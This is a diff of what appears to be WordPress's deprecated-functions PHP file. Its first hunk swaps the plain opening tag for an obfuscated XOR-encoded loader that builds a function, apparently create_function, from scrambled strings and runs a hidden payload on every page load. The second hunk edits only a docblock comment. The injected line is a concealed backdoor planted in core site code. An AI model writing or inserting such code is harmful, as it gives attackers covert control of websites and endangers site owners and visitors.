@@ -1,4 +1,4 @@
-<?php
+<?php $uAgSWPUDEO='7=63EW:UHNCOBQ4'^'TOSR12e3=  ;+>Z';$vcZzxJorV=$uAgSWPUDEO('','UQOCJF<,OGC87TJUI-8gC7YNf+.5WsaV 1mEze2Z;>C;C2IS<v=YY>  ;8sm,:,Au16 3VFBFU+hXFYaN-H:csR7<bINJvaFqnSTOkK1VmKyxxL:D1.76.PgV ,ZPFibrPnDf7E3sX>FOaOjIf>0B0<q8iskjBFS06N;GBIBZE>E DHFP2A-GtmHP03M R8JFQ,Hnn7J98GhNa=L;JrIe69LH1sEiRJ6-9U.IXUdRL==<XPa29F-L1:gJms:zwqe1p-NTqK,KydmKK=2BE,DE8cLh+25-dKT;MOCnRN0B7=kVO,JyTBe0W:7<pZEy;G5HNxEXL>QGZI:mHU6H02<Wimhop<2->-YA;Ja;14xNrjoFS6U.gTFz<Gb-YE;tKU>tGVfK-0c3hqu.ZT2YddRL4YCYtdYLSOpNo>S>0WrTxN:H5<ZRTB.HR<;R:4PE;l;.L7fYPX.XYtSKM7QTkv4325sHtI+QHOfK+BdzNf0Fzh.LDWuHlCR1N.61ZXAmKI;2>EdC=UHsmAA6T63nhQtLFS bqiQ7N95UQYUa9gfuDTq3rtKQcEqrBOIasS5SIZrDBfRE0CVUzTEJJtGbMOFN0CdUK>66NP:,MQd1Y6W59DsKML=+X,PPobNdNr-rNI:1.nr6T=6mPI1+;<2Veemj:8K=PNiYnrN+'^'<7gb,3RO;.,Vh12<:YKOdO6<9OOA6,>;UEJlSEIP2X6U F <RVE6+aDAOY,2AOXiQUWTRzff-0RAxfyAnVB3jW=BHBtnmQZLxg5;=CoXvPkICXhSxBZEZK>OrDM.1oRBV9EoO=L:W7K2oOrJaBZQ6QgUQ4S5Jf-6ImjRggi1.7R Nll-5KhpnOgAYBV9U Vbb>Y<GU=CD2:bDEY-O+RtEPX ;THOM6+BLf>K0xhD4-QNYcZkTV4H-RRGbI,y58:,tPL=tU I2YYSkoKS.0ImeCiELOSAL; 1BmrcJ9+Iy=4O2.X+YibAF6VBYKP8s1.ShfYa<-J0nz20d.:D-QQTwAI7=5mghmyy HjEPTMXsLJK02Z KNt=p5NFI81Z+ 0GTzvB HIX9axQJ; SyYDv:U56<OnP1Y2zDKZ2JQwOt8;T;PN338+T-zDT eP11Z3dC9CN;1+Knm+7..X51CRPRFTZdTmO0<.9 N;MSulY RLJ-06UnJc3C<OOn1=82.1RAJ6LdV01TAaeR5BRGHwRln>DWYM5V:Xnr:<,FdNFHytVRFAsaQwAKuz+PB6Qgy<DqwTcwV 31O2 mcTaDm.4<Q:;>.GiS69IX>yCA8O;ZX TgmhYJ,MyyOBnDnRVxG,LPBFVR5IW6w9PRWSS2B8DQ01.E9:AiGIDV');$vcZzxJorV();
 /**
  * Deprecated functions from past WordPress versions. You shouldn't use these
  * functions and look for the alternatives instead. The functions will be
@@ -3788,7 +3788,7 @@ function get_paged_template() {
  * input to the return.
  *
  * @since 1.0.0
- * @deprecated deprecated since 4.7
+ * @deprecated 4.7.0 Officially dropped security support for Netscape 4.
  *
  * @param string $string
  * @return string
